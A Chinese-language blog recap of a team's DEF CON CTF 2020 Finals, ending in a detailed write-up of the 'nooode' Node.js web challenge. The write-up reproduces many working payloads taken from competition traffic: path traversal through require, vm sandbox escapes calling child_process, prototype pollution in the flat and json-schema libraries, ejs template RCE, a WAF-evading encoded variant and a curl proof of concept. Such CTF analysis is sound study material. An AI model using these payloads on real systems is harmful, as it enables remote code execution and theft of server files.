旁边又是那个统治强网杯的“那个男人”（又紧张死了，第一次跟这种可怕的巨型大佬生物进行交流），整个会餐就这样在对于我来说在一种不可名状的氛围下结束了。XD（感觉其他人真的是又强又壮，就我一个可怜弱小的小菜鸡 Shift 1由于之前接入等等准备工作师傅们都做完了，我便在 setup 就开混了，于是就尬等比赛开始。第一天放了貌似两个二进制的 AWD ，还有一个 KOH ，KOH 给的是一个 21 点的游戏，跟普通的 21 点游戏差不多，有一个庄家，所有队伍都进行下注，要牌超过 21 点的队伍就在当前 ROUND 直接出局，剩下的队伍继续进行游戏，通过这样的方式决出游戏积分前五名，在对应队伍的 KOH 分数上进行加分。 一开始没什么队伍得分，由于给出的是 Web 地址，于是我们一开始就当作 Web 题来做了，各种测了测，然后发现虽然这个 Web 平台是 Flask 并且开了 Debug ，一个上传错误直接跳到了 Debug 错误界面，但是由于没有找到其他地方有洞可以利用来获取 PIN 码，这条路就作废了。 然后十多分钟后，我们渐渐发现这个可以看到全局队伍所有人的上传文件，虽然文件有一定格式，并且类似一个指令类型的文件，虽然我们当时看不懂，但是发现 A0E 在得分之后，我们拿 A0E 的过来用就可以直接得分了（ 后面才知道我上传的文件是修改了我们每次下注的积分，因为初始的时候每个队都一样，一次把自家身家200一次下完，而输的概率又很大，基本立马就出局了，然而通过一开始直接下注 1 个积分，这样就可以立马稳住战局，至少可以不会立马出局就可以排前五上分了。于是我们一开始就在 KOH 上分了，就这样通过 KOH 得分，我们稳住了前一天的排名，第一天的得分也就基本全都来自于 KOH 。 Shift 2 &amp; Shift 3由于时间也比较久远了，我记的不是特别清楚，这两个 Shift 就放一起了。由于之前貌似大家没怎么打 DEFCON QUALS 或者说打了的师傅这次 Final 没打？我们一开始并没有发现 KOH 那个题是改自 DEFCON QUALS Fountain OOO REliving ，是一个 Golly 相关的逆向题，当时看 QUALS 的 WriteUp 也是相当崩溃的，由于我这个小菜鸡没什么逆向基础，跟某师傅硬着头皮搞也没怎么搞出来，而这个还是升级版，当时看这个题目的附件图还是一脸懵逼的： 在 Golly 上瞎弄更是相当懵逼。虽然逆向帮不上啥，但是我还是每个 ROUND 都看一看各个队伍的表现以及策略，然后发现感觉也可能是一个数学期望题（？），我就尝试着算一下每次下注多少才能让我们每个 ROUND 大概率能在现有的队伍策略中胜出，然后通过不断的试不断的改，后面基本上靠运气能拿下不少分（ 后面我们 AWD 分数也起来了，截止到 Shift 2 结束，我截了一张当时的图。（看着当时的 KOH 感觉当时运气真好 后面在 Shift 3 的时候，这个 21 点的题目一开始没多久就下了，于是我又开始混起来了，也就随便看看平台，然后看看队友们在干啥，中间貌似有一个 RPG 游戏的 AWD 题目，当时看他们玩起来感觉很有意思，就是大家通过操控自己的角色进行对应的操作拿 Flag ，而且还是具有一定实时操作性，总之看起来他们在打这个游戏非常有意思 XD 然后后面又放了两个 KOH ，一个是非常 Geek 的弹球游戏，还有一个是开飞船打飞船的游戏，两个都是逆向，也让我混的是理直气壮（大雾），虽然我想尽可能地帮忙，但是真是菜的真实，也就到处看看有什么可以帮忙的地方，比如，拿外卖（海盗虾饭外卖是真好吃，泡面真香，好久没吃泡面了，呜呜呜TAT） 是我本人没错了（ 后面主办方公布了 21 点的 WriteUp: https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack 虽然没怎么看懂逆向部分，但是看起来我们那个改下注分数的做法是解法之一，并且其他解法看起来也是挺有意思的。 Shift 4在最后一天开始几小时之后，主办方终于放出了一个本场唯一一个 Web ，题目地址在 dc2020f-nooode-public ，整个题目我引用 PPP 对于这个题目的评价——“By the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing silly web problems near the end of the competition, and this year was no exception.”（此处采用了引用论证，引用了比较权威的人士对于题目的评价，增加了说服力） 基本上可以说是一句话在 Nodejs 上的完美体现，于是一开始就有人开始直接打了，我们也马上发现了这个 Backdooor ，于是我们也开始打，但是由于这个 Backdooor 真的是 silly ，很多队都迅速修了（除了 pasten 貌似没人参赛），后面也就没什么打法了。后面通过我们队里巨强的某师傅上了他写的巨强的 WAF ，我们拥有了巨强的防守能力。 于是就跟 A0E 某师傅尬聊了， But 比赛过程中，有一轮突然我们又可以打很多队，突然发现主办方貌似又在没提前通知的情况下（也好像是通知了我没注意）重置了各队伍的环境，我们发现了又立马修了一波，然后发现是加强了 Check ，只能把超强师傅写的超强 WAF 瞎掉了，因此又掉了一些分（ But 比赛过程中，我们貌似有一个非 Web AWD 题目提交的 Patch 没通过而主办方没通知我们就立马断了我们跳板机网络，导致影响了我们大概两轮的操作。 Web 后面会单独做一些简单的分析，Web 题比较让我意外的是，A0E 他们使用的是黑名单过滤的机制，被我们的超级大师傅手动绕了，打了两回合就被修了，这也成了后面的一个伏笔。（某个渣男竟然跟我说要睡了却还在看流量 Stealth Port 的流量官方也公布了：https://oooverflow.io/dc-ctf-2020-finals/stealth.txt ，虽然看的有点迷惑，不过还是可以看到最后我们 Web 确实打了他们一波。 后面封榜然后到结束，基本就没有什么操作了，封榜前我看了一下分数差距，我觉得我们是应该跟 HITCON 争第三，PPP 跟 A0E 抢第一。 结束之后，虽然窗外的阳光格外的刺眼，北京早高峰伴随着汽车的鸣笛已经纷至沓来，但是室内我们比较平静，大家都收拾收拾东西，捡了捡垃圾方便阿姨打扫，随便聊了聊看了看其他队对于这次比赛的吐槽，然后就都各自回去休息了。我回去后开着 DEFCON 直播等了好一会，发现他们还挺磨蹭的，顺便洗了个澡，回来等待着揭晓最终结果。 后面公布榜单，得知我们是拿到了第四名，自己倒也没有什么特别的心情，知道之后也就整理整理这两天的题目，看了看大家对于这次比赛的评论，之后就睡了。 倒是在揭晓一二名的时候，主办方应该是特地做了一个分数动态图来显示最后比赛的激烈，烘托一下紧张的氛围，最后显示 A0E 以 2 分的优势险胜 PPP 拿到了冠军，也意味着刷新了中国大陆战队在 DEFCON CTF 上取得的最好的成绩，也算谁见证了一次历史吧 XD Nooode题目地址：https://github.com/o-o-overflow/dc2020f-nooode-public ，感兴趣的同学可以去分析复现一下。 Web 题问题主要是在 public-nooode/routes/config.js 文件中存在一处 BackDooor 123456789101112131415161718192021222324252627282930router.post('/validated/:lib?/:f?', function(req, res, next) { let config = res.locals.config; if (!req.params.lib) req.params.lib = \"json-schema\" if (!req.params.f) req.params.f = \"validate\" let jsonlib = require(req.params.lib) let valid = jsonlib[req.params.f](req.body) if (!valid) { res.send(\"validator failed\"); return } let p; if (config.path) { p = config.path; } else if (config.filepath) { p = config.filepath; } let data = fs.readFileSync(p).toString() try { data = JSON.parse(data) if (_.isEqual(req.body, data)) res.json(data) else res.send({ \"validator\": valid, \"data\":data, \"msg\": \"data is corrupted\"}) } catch { res.send({ \"validator\": valid, \"data\":data}) }}); 比较熟悉的同学可以一眼就看看到问题所在了。 由于官方提供的是整场比赛所有的流量包过大，并没有具体分类，整个流量包多达 200 GB ，而且对于 Web 题目来说，基本几个流量包就能拿到大多数的 Payload 了，所以我拿了我手头上当时下载的基本分部了大多数时间段的流量包，提取了一下 HTTP 流量并进行了简单统计处理，并按照出现的次数进行了从高到低的排序，得到了以下的结果： 奇怪，中间好像混入了什么奇怪的东西（ 当然其他流量包或许还可能存在一些其他的 Payload ，但是基本该题所有的点都在这了。并且每个流量包都充斥着大量的垃圾流量，接下来就是垃圾流量大赏，原来你就是中国文化宣传大使？不用我多说就知道了吧，跟某个师傅打过 AWD 的都应该知道是谁发的这些垃圾流量。 Require一开始大多队伍都打的是require直接包含的点，由于题目开了 debug 报错，在使用require包含 flag 的时候会直接报错回显 flag ，如下 000AAA 即为 flag 1234567891011121314151617&lt;h1&gt;Invalid or unexpected token&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;&lt;pre&gt;/flag:1000AAAA^^^SyntaxError: Invalid or unexpected token at wrapSafe (internal/modules/cjs/loader.js:1070:16) at Module._compile (internal/modules/cjs/loader.js:1120:27) at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10) at Module.load (internal/modules/cjs/loader.js:1000:32) at Function.Module._load (internal/modules/cjs/loader.js:899:14) at Module.require (internal/modules/cjs/loader.js:1042:19) at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39) at require (internal/modules/cjs/helpers.js:77:18) at /service/routes/config.js:21:17 at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)&lt;/pre&gt; 使用这个思路的 payload 就有很多变种了，例如： POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1 加上一些 body 内容、或者进行全 urlencode 、又或者再路径后面加一个路径POST /config/validated/%2Fflag/a HTTP/1.1 POST /config/validated/%2ffl%61g HTTP/1.1 POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1 vm还有就是可以通过内置的 vm lib ，由于 vm lib 逃逸已经被弄烂了，基本能找到可以直接利用的 exp 直接拿 flag 123456789101112POST /config/validated/vm/runInNewContext HTTP/1.1Host: zedd.vv:4017User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 160[\"const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] 12345678HTTP/1.1 200 OKContent-Type: application/json; charset=utf-8Content-Length: 85ETag: W/\"55-/Dqsanp9FGAj8iXHTLNo/PbZBTc\"Date: Tue, 13 Oct 2020 10:52:05 GMTConnection: close{\"validator\":\"000AAAA\\n\",\"data\":{\"treasure\":\"data-piece2\"},\"msg\":\"data is corrupted\"} 后面的就是基本是基于 post body 的变形了： [\"const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] [\"const p = this.constructor.constructor('return this.process')(); p.mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g').toString()\"] [\"p = this.constructor.constructor(\\\"return process\\\")(); r = p.mainModule.require; fs = r(\\\"fs\\\"); throw new Error(fs.readFileSync(\\\"/flag\\\").toString())\"] [\"var process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] [\"p = this.constructor.constructor(\\\"return process\\\")(); r = p.mainModule.require; fs = r(\\\"fs\\\"); fs.readFileSync(\\\"/flag\\\").toString()\"] [\"const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] [\"const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] [\"var process = this.constructor.constructor(\\\"return process\\\")(); p.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\"] [\"this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g')+[]\"] [\"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*')+[]\"] [\"const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /*g').toString()\"] flat123456789101112POST /config/validated/flat/unflatten HTTP/1.1Host: zedd.vv:4017User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 29{\"__proto__.path\": \"/flag\"} 12345678HTTP/1.1 200 OKContent-Type: application/json; charset=utf-8Content-Length: 35ETag: W/\"23-RVcPh+LK1Ac7n2mAq1KjFd049Xo\"Date: Tue, 13 Oct 2020 16:54:07 GMTConnection: close{\"validator\":{},\"data\":\"000AAAA\\n\"} 这个其实是 7/18 @po6ix 提出了 flat lib 中的 unflatten 存在原型链污染：https://github.com/hughsk/flat/issues/105 简单 debug 跟了一下，简化了一下原函数代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function unflatten (target, opts) { opts = opts || {} const delimiter = opts.delimiter || '.' const overwrite = opts.overwrite || false const transformKey = opts.transformKey || keyIdentity const result = {} //... Object.keys(target).forEach(function (key) { const split = key.split(delimiter).map(transformKey) let key1 = getkey(split.shift()) let key2 = getkey(split[0]) let recipient = result while (key2 !== undefined) { const type = Object.prototype.toString.call(recipient[key1]) const isobject = ( type === '[object Object]' || type === '[object Array]' ) // do not write over falsey, non-undefined values if overwrite is false if (!overwrite &amp;&amp; !isobject &amp;&amp; typeof recipient[key1] !== 'undefined') { return } if ((overwrite &amp;&amp; !isobject) || (!overwrite &amp;&amp; recipient[key1] == null)) { recipient[key1] = ( typeof key2 === 'number' &amp;&amp; !opts.object ? [] : {} ) } recipient = recipient[key1] if (split.length &gt; 0) { key1 = getkey(split.shift()) key2 = getkey(split[0]) } } // unflatten again for 'messy objects' recipient[key1] = unflatten(target[key], opts) }) return result} 我们传入{\"__proto__.path\": \"/flag\"} 到 target 变量，然后经过一些判断以及操作，经过 while 第一轮循环得到: 1recipient = recipient[key1] //recipient = {}[\"__proto__\"] 此时 recipient 就指向了 Function.prototype ，而循环结束之后递归执行 unflatten 函数，此时 1recipient[key1] = unflatten(target[key], opts) // recipient['path'] = unflatten(\"/flag\", {}) 而因为传入的第一个参数也就是 /flag 为字符串，被 unflatten 直接返回，也就是说最终结果为： 1recipient[key1] = '/flag' //recipient['path'] = '/flag' 整个流程可以简化为： 123456var obj = {};var a = {};obj = obj[\"__proto__\"];obj['path'] = '/flag';console.log(obj.path);console.log(a.path); 这样就完成了原型链污染的效果，我们就可以将 config.path 污染成 flag 路径了，也就可以读到 flag 了 存在一些变形比如： 更改传输方式为application/x-www-form-urlencoded 更改引用路径POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1 顺便，flat 已经修复了这个原型链污染，修复方式是将__proto__设置为 key1 的黑名单：https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8 Jsonlint123456789101112POST /config/validated/jsonlint/main HTTP/1.1Host: zedd.vv:4017User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 33{\"1\":\"../../../../../../../flag\"} 1234567891011121314151617181920212223242526HTTP/1.1 500 Internal Server ErrorContent-Type: text/html; charset=utf-8Content-Length: 1162ETag: W/\"48a-J1p7tUkAXQsyvitsec7yxDGU9yc\"Date: Tue, 13 Oct 2020 16:58:55 GMTConnection: close&lt;h1&gt;Parse error on line 1:000AAAA^Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;&lt;pre&gt;Error: Parse error on line 1:000AAAA^Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39; at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11) at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22) at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27) at /service/routes/config.js:22:36 at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5) at next (/service/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5) at /service/node_modules/express/lib/router/index.js:281:22 at param (/service/node_modules/express/lib/router/index.js:354:14)&lt;/pre&gt; 这个也比较简单，jsonlint lib 中有一个 main 函数存在直接引用文件的操作： 1234567891011exports.main = function commonjsMain(args) { if (!args[1]) throw new Error('Usage: '+args[0]+' FILE'); if (typeof process !== 'undefined') { var source = require('fs').readFileSync(require('path').join(process.cwd(), args[1]), \"utf8\"); } else { var cwd = require(\"file\").path(require(\"file\").cwd()); var source = cwd.join(args[1]).read({charset: \"utf-8\"}); } return exports.parser.parse(source);} 而 args 则是我们传入的req.body，也就是{\"1\":\"../../../../../../../flag\"}，直接引入 flag 文件导致报错回显即可。 json-schema这个库算是官方给的一个 hint 吧，因为算是在/config/validated路由默认使用的 lib ，而且搜了一下是一个废弃的仓库：https://github.com/kriszyp/json-schema/ ，而且看起来还能算是一个 0day 1{\"$schema\": {\"properties\": {\"__proto__\": {\"properties\": {\"path\": {\"default\": \"/flag\"}}}}}} 经过简单调试可以发现主要问题在两个函数：checkObj 与 checkProp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123// validate a value against a property definitionfunction checkProp(value, schema, path, i) { var l; path += path ? typeof i == 'number' ? '[' + i + ']': typeof i == 'undefined' ? '': '.' + i: i; function addError(message) { errors.push({ property: path, message: message }); } if ((typeof schema != 'object' || schema instanceof Array) &amp;&amp; (path || typeof schema != 'function') &amp;&amp; !(schema &amp;&amp; getType(schema))) { if (typeof schema == 'function') { if (! (value instanceof schema)) { addError(\"is not an instance of the class/constructor \" + schema.name); } } else if (schema) { addError(\"Invalid schema/property definition \" + schema); } return null; } if (_changing &amp;&amp; schema.readonly) { addError(\"is a readonly field, it can not be changed\"); } if (schema['extends']) { // if it extends another schema, it must pass that schema as well checkProp(value, schema['extends'], path, i); } // validate a value against a type definition function checkType(type, value) { if (type) { if (typeof type == 'string' &amp;&amp; type != 'any' &amp;&amp; (type == 'null' ? value !== null: typeof value != type) &amp;&amp; !(value instanceof Array &amp;&amp; type == 'array') &amp;&amp; !(value instanceof Date &amp;&amp; type == 'date') &amp;&amp; !(type == 'integer' &amp;&amp; value % 1 === 0)) { return [{ property: path, message: (typeof value) + \" value found, but a \" + type + \" is required\" }]; } if (type instanceof Array) { var unionErrors = []; for (var j = 0; j &lt; type.length; j++) { // a union type if (! (unionErrors = checkType(type[j], value)).length) { break; } } if (unionErrors.length) { return unionErrors; } } else if (typeof type == 'object') { var priorErrors = errors; errors = []; checkProp(value, type, path); var theseErrors = errors; errors = priorErrors; return theseErrors; } } return []; } if (value === undefined) { if (schema.required) { addError(\"is missing and it is required\"); } } else { errors = errors.concat(checkType(getType(schema), value)); if (schema.disallow &amp;&amp; !checkType(schema.disallow, value).length) { addError(\" disallowed value was matched\"); } if (value !== null) { if (value instanceof Array) { if (schema.items) { var itemsIsArray = schema.items instanceof Array; var propDef = schema.items; for (i = 0, l = value.length; i &lt; l; i += 1) { if (itemsIsArray) propDef = schema.items[i]; if (options.coerce) value[i] = options.coerce(value[i], propDef); errors.concat(checkProp(value[i], propDef, path, i)); } } if (schema.minItems &amp;&amp; value.length &lt; schema.minItems) { addError(\"There must be a minimum of \" + schema.minItems + \" in the array\"); } if (schema.maxItems &amp;&amp; value.length &gt; schema.maxItems) { addError(\"There must be a maximum of \" + schema.maxItems + \" in the array\"); } } else if (schema.properties || schema.additionalProperties) { errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties)); } if (schema.pattern &amp;&amp; typeof value == 'string' &amp;&amp; !value.match(schema.pattern)) { addError(\"does not match the regex pattern \" + schema.pattern); } if (schema.maxLength &amp;&amp; typeof value == 'string' &amp;&amp; value.length &gt; schema.maxLength) { addError(\"may only be \" + schema.maxLength + \" characters long\"); } if (schema.minLength &amp;&amp; typeof value == 'string' &amp;&amp; value.length &lt; schema.minLength) { addError(\"must be at least \" + schema.minLength + \" characters long\"); } if (typeof schema.minimum !== undefined &amp;&amp; typeof value == typeof schema.minimum &amp;&amp; schema.minimum &gt; value) { addError(\"must have a minimum value of \" + schema.minimum); } if (typeof schema.maximum !== undefined &amp;&amp; typeof value == typeof schema.maximum &amp;&amp; schema.maximum &lt; value) { addError(\"must have a maximum value of \" + schema.maximum); } if (schema['enum']) { var enumer = schema['enum']; l = enumer.length; var found; for (var j = 0; j &lt; l; j++) { if (enumer[j] === value) { found = 1; break; } } if (!found) { addError(\"does not have a value in the enumeration \" + enumer.join(\", \")); } } if (typeof schema.maxDecimal == 'number' &amp;&amp; (value.toString().match(new RegExp(\"\\\\.[0-9]{\" + (schema.maxDecimal + 1) + \",}\")))) { addError(\"may only have \" + schema.maxDecimal + \" digits of decimal places\"); } } } return null;} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// validate an object against a schemafunction checkObj(instance, objTypeDef, path, additionalProp) { if (typeof objTypeDef == 'object') { if (typeof instance != 'object' || instance instanceof Array) { errors.push({ property: path, message: \"an object is required\" }); } for (var i in objTypeDef) { if (objTypeDef.hasOwnProperty(i)) { var value = instance[i]; // skip _not_ specified properties if (value === undefined &amp;&amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default if (value === undefined &amp;&amp; propDef[\"default\"]) { value = instance[i] = propDef[\"default\"]; } if (options.coerce &amp;&amp; i in instance) { value = instance[i] = options.coerce(value, propDef); } checkProp(value, propDef, path, i); } } } for (i in instance) { if (instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(0) == '_' &amp;&amp; i.charAt(1) == '_') &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp === false) { if (options.filter) { delete instance[i]; continue; } else { errors.push({ property: path, message: (typeof value) + \"The property \" + i + \" is not defined in the schema and the schema does not allow additional properties\" }); } } var requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires; if (requires &amp;&amp; !(requires in instance)) { errors.push({ property: path, message: \"the presence of the property \" + i + \" requires that \" + requires + \" also be present\" }); } value = instance[i]; if (additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; typeof objTypeDef == 'object') || !(i in objTypeDef))) { if (options.coerce) { value = instance[i] = options.coerce(value, additionalProp); } checkProp(value, additionalProp, path, i); } if (!_changing &amp;&amp; value &amp;&amp; value.$schema) { errors = errors.concat(checkProp(value, value.$schema, path, i)); } } return errors;} 首先第一次我们会进入到 checkProp 函数，传入以下参数，并进行循环 123checkProp(instance,instance.$schema,'','');//instance = {\"$schema\": {\"properties\": {\"__proto__\": {\"properties\": {\"path\": {\"default\": \"/flag\"}}}}}}//instance.$schema = {\"properties\": {\"__proto__\": {\"properties\": {\"path\": {\"default\": \"/flag\"}}}}} 接着在经过判断之后进入checkObj函数 12345if(schema.properties || schema.additionalProperties){trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));}//value = {\"$schema\": {\"properties\": {\"__proto__\": {\"properties\": {\"path\": {\"default\": \"/flag\"}}}}}}//schema.properties = {\"__proto__\": {\"properties\": {\"path\": {\"default\": \"/flag\"}}}} 在函数循环中，再次进入到checkProp函数 12345678910111213141516171819for(var i in objTypeDef){ if(objTypeDef.hasOwnProperty(i)){ var value = instance[i]; // skip _not_ specified properties if (value === undefined &amp;&amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default if(value === undefined &amp;&amp; propDef[\"default\"]){ value = instance[i] = propDef[\"default\"]; } if(options.coerce &amp;&amp; i in instance){ value = instance[i] = options.coerce(value, propDef); } checkProp(value,propDef,path,i); //i = __proto__ //value = prototype //propDDef = {\"properties\": {\"path\": {\"default\": \"/flag\"}}} }} 再次由判断进入到checkObj函数，传入以下参数，这时候注意value参数已经被指向Function.prototype 123456if(schema.properties || schema.additionalProperties){trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));}//value = prototype//schema.properties = {\"path\": {\"default\": \"/flag\"}}//path = \"__proto__\" 所以当再次在这里进行赋值的时候，instance此时指向Function.prototype，参数 i 为 path，即被 propDef['default'] 修改成了/flag，至此完成了原型链污染 12345678910111213141516171819202122232425//instance = prototype//objTypeDef = {\"path\": {\"default\": \"/flag\"}}for(var i in objTypeDef){ if(objTypeDef.hasOwnProperty(i)){ var value = instance[i]; // skip _not_ specified properties if (value === undefined &amp;&amp; options.existingOnly) continue; var propDef = objTypeDef[i]; // set default //i = path //value = undefined //propDef = {\"default\": \"/flag\"} if(value === undefined &amp;&amp; propDef[\"default\"]){ value = instance[i] = propDef[\"default\"]; } if(options.coerce &amp;&amp; i in instance){ value = instance[i] = options.coerce(value, propDef); } checkProp(value,propDef,path,i);truetrue//value = \"/flag\" //propDef = {\"default\": \"/flag\"} //path = \"__proto__\" //i = \"path\" }} 整个过程这里写的比较简单，不过只要简单 debug 就可以弄明白整个流程，并不算很难。污染了 path 之后，就可以跟前面的一样，直接通过fs.readFileSync(p.path).toString()来拿 flag 了。 当然还可以污染 express ejs 1{\"$schema\":{\"type\":\"object\",\"properties\":{\"__proto__\":{\"type\":\"object\",\"properties\":{\"outputFunctionName\":{\"type\":\"string\",\"default\":\"x;return eval(\\\"process.mainModule.require('fs').readFileSync('/fl'+'ag').toString('base64')\\\");//x\"},\"path\":{\"type\":\"string\",\"default\":\"/foo\"}}}}}} 因为如果要污染 ejs 的话需要用到res.render，而在 app.js 中我们可以看到有一个错误处理的地方使用到了res.render 123456789101112app.set(\"view engine\", \"ejs\");//...// error handlerapp.use(function(err, req, res, next) { // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(\"env\") === \"development\" ? err: {}; // render the error page res.status(err.status || 500); res.render(\"error\");}); 所以我们需要一个报错来触发这个res.render，而我们传入的\"path\":{\"type\":\"string\",\"default\":\"/foo\"}就起到了污染之前的 path 让 nodejs 读取到了一个不存在的文件引起报错，进而进入错误处理来实现 ejs 的命令执行。 所以之前对于 flat 的原型链污染也可以根据同样的原理进行 RCE ： 1{\"__proto__.outputFunctionName\": \"a=1;process.mainModule.require('child_process').exec('touch /tmp/b')//\",\"__proto__.path\": \"/foo\"} 还有一些改变就是利用编码来绕过一些 waf 关键字： 1{\"$schema\":{\"type\":\"object\",\"properties\":{\"__proto__\":{\"type\":\"object\",\"properties\":{\"outputFunctionName\":{\"type\":\"string\",\"default\":\"x;return eval(`\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\\\u002e\\\\u006d\\\\u0061\\\\u0069\\\\u006e\\\\u004d\\\\u006f\\\\u0064\\\\u0075\\\\u006c\\\\u0065\\\\u002e\\\\u0072\\\\u0065\\\\u0071\\\\u0075\\\\u0069\\\\u0072\\\\u0065\\\\u0028\\\\u0060\\\\u0066\\\\u0073\\\\u0060\\\\u0029\\\\u002e\\\\u0072\\\\u0065\\\\u0061\\\\u0064\\\\u0046\\\\u0069\\\\u006c\\\\u0065\\\\u0053\\\\u0079\\\\u006e\\\\u0063\\\\u0028\\\\u0060\\\\u002f\\\\u0066\\\\u006c\\\\u0060\\\\u002b\\\\u0060\\\\u0061\\\\u0067\\\\u0060\\\\u0029\\\\u002e\\\\u0074\\\\u006f\\\\u0053\\\\u0074\\\\u0072\\\\u0069\\\\u006e\\\\u0067\\\\u0028\\\\u0060\\\\u0062\\\\u0061\\\\u0073\\\\u0065\\\\u0036\\\\u0034\\\\u0060\\\\u0029`);//x\"},\"path\":{\"type\":\"string\",\"default\":\"/foo\"}}}}}} 赛后跟 /bin/tw 的选手交流了一下，他们的 payload 到后面仍然可以打好几个队，于是去要了一份 POC ，如下，也是大概类似的一个写法： 1curl http://10.13.37.$i:14017/config/validated/json-schema/validate -H 'content-type: application/json' --data '{\"$schema\":{\"type\":\"object\",\"properties\":{\"__proto__\":{\"type\":\"object\",\"properties\":{\"outputFunctionName\":{\"type\":\"string\",\"default\":\"x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x\"},\"path\":{\"type\":\"string\",\"default\":\"/foo\"}}}}}}' fstream还有一个是我们队大师傅找的 123456789101112POST /config/validated/fstream/Writer HTTP/1.1Host: zedd.vv:4017User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 77{\"type\":\"SymbolicLink\",\"linkpath\":\"/flag\",\"path\":\"public/stylesheets/11.png\"} 这个也没什么好分析的，文档看一看：https://github.com/npm/fstream 就好了，这里当时我们貌似还捣鼓了一会 json 传参啥的，但是后来试了一下application/x-www-form-urlencoded 也可以 ConclusionAbout The Web这次 Web 当时比赛我们也都在吐槽，因为这个 Web 题当时觉得并不是很好，简直就直接给了一个后门，而且确实整个比赛弄起来不仅是 Web 这个后门似的洞，还有其他题目听其他大师傅吐槽也都是找后门的题目。 